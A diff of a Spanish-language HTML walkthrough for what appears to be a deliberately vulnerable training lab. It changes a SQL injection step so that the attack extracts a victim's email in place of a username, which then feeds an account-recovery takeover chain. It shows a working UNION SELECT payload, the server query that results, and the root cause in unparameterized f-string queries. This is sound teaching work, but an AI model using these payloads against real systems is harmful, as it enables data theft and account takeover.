@@ -300,46 +300,46 @@
       <div class="step-card card">
         <div class="step-header" style="background: #eff6ff;">
           <i class="bi bi-database-exclamation" style="color: #1d4ed8;"></i>
-          <span class="fw-semibold">SQL Injection — Extraer el username</span>
+          <span class="fw-semibold">SQL Injection — Extraer el email</span>
           <span class="vuln-tag ms-1" style="background:#dbeafe;color:#1d4ed8;">A05 · SQLi</span>
           <span class="portal-badge portal-tracking ms-auto"><i class="bi bi-truck"></i> Tracking :5001</span>
         </div>
         <div class="step-body">
           <p style="font-size:.9rem;" class="mb-2">
-            Con el ID de cliente <code>204815</code> obtenido en el Paso 1, el atacante usa el
-            buscador interno de soporte, que concatena el parámetro directamente en la query SQL.
-            Inyecta un <code>UNION SELECT</code> para extraer el username de la víctima.
+            El buscador de envíos por email concatena el parámetro directamente en la query.
+            El atacante todavía no tiene el email (sólo el ID de cliente), así que inyecta un
+            <code>UNION SELECT</code> para extraerlo usando ese ID.
           </p>
 
           <div class="code-block">
             <span class="label">BÚSQUEDA NORMAL</span><br/>
-            GET <span class="url">http://localhost:5001/support/search?</span><span class="param">user_id</span>=<span class="value">204815</span>
+            GET <span class="url">http://localhost:5001/?</span><span class="param">email</span>=<span class="value">tucorreo@ejemplo.com</span>
             <br/><br/>
-            <span class="comment">→ devuelve: 204815, Carlos, Gomez (sin username)</span>
+            <span class="comment">→ devuelve los envíos asociados a ese email</span>
           </div>
 
           <div class="code-block">
-            <span class="label">PAYLOAD INYECTADO</span><br/>
-            GET <span class="url">http://localhost:5001/support/search?</span><span class="param">user_id</span>=<span class="inject">204815 UNION SELECT id, username, last_name FROM users WHERE id=204815--</span>
+            <span class="label">PAYLOAD INYECTADO (en el campo de búsqueda)</span><br/>
+            <span class="inject">' UNION SELECT email,'-','-','-','-' FROM users WHERE id=204815--</span>
           </div>
 
           <div class="code-block">
             <span class="label">QUERY RESULTANTE EN EL SERVIDOR</span><br/>
-            SELECT u.id, u.first_name, u.last_name<br/>
-            FROM users u<br/>
-            WHERE u.id = <span class="inject">204815 UNION SELECT id, username,<br/>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;last_name FROM users WHERE id=204815--</span>
+            SELECT s.shipment_id, s.order_number, s.status, ...<br/>
+            FROM shipments s JOIN users u ON s.user_id = u.id<br/>
+            WHERE u.email = <span class="inject">'' UNION SELECT email,'-','-','-','-'<br/>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FROM users WHERE id=204815--</span>
           </div>
 
           <div class="result-box">
-            <span class="field">Username extraído (aparece en la columna Nombre)</span><br/>
-            <span class="val" style="font-size:1.05rem;">carlos_gomez</span>
+            <span class="field">Email extraído (aparece en la columna Nro. de envío)</span><br/>
+            <span class="val" style="font-size:1.05rem;">carlos.gomez@gmail.com</span>
           </div>
 
           <div class="why-box mt-2">
             <strong>Raíz del problema:</strong> el backend construye la query con f-string:
-            <code>f"WHERE u.id = {user_id}"</code> sin usar consultas parametrizadas.
-            No hay contraseñas en la tabla, pero el username es suficiente para el paso siguiente.
+            <code>f"WHERE u.email = '{email}'"</code> sin usar consultas parametrizadas.
+            El IDOR sólo dio el ID de cliente, así que la inyección es necesaria para el email.
           </div>
         </div>
       </div>
@@ -362,9 +362,9 @@
           </p>
 
           <div class="code-block">
-            <span class="label">REQUEST</span><br/>
-            POST <span class="url">http://localhost:5000/account/recover</span><br/>
-            <span class="param">username</span>=<span class="value">carlos_gomez</span>
+            <span class="label">RECUPERACIÓN DE CUENTA (por email)</span><br/>
+            <span class="url">http://localhost:5000/account/recover</span><br/>
+            <span class="param">email</span>=<span class="value">carlos.gomez@gmail.com</span>
           </div>
 
           <div class="code-block">
@@ -497,9 +497,9 @@
           <tr>
             <td class="ps-3 fw-semibold">2</td>
             <td><span class="portal-badge portal-tracking">Tracking</span></td>
-            <td><code>GET /support/search?user_id=204815 UNION SELECT…</code></td>
+            <td><code>/?email=' UNION SELECT email … WHERE id=204815--</code></td>
             <td><span class="vuln-tag" style="background:#dbeafe;color:#1d4ed8;">A05 SQLi</span></td>
-            <td>Username: <code>carlos_gomez</code></td>
+            <td>Email: <code>carlos.gomez@gmail.com</code></td>
           </tr>
           <tr>
             <td class="ps-3 fw-semibold">3</td>
